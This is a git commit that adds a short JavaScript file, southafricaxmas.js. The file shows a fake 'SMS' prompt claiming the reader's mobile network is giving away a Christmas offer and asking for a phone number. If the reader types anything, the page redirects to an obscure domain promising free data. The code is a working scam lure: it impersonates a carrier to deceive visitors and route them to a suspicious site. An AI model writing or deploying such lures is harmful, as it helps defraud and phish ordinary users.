bbdb376a521863c2285158b1d74ae7b110d7ba48
newetijazz11 <newetijazz11@gmail.com>
2025-12-20 17:35:47 +0100

    Create southafricaxmas.js

---
+++ southafricaxmas.js
@@ -0,0 +1,8 @@
+var password = 'GET XMAS OFFER'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive Christmas offer from your favourite network. Please press OK to Enter your Phone Number.',
+  'GET XMAS OFFER'
+);
+if (password != 'GET XMAS OFFER') {
+  location.href = 'https://www.bhufrizx.online/Southafrica-xmas.50gb';
+}
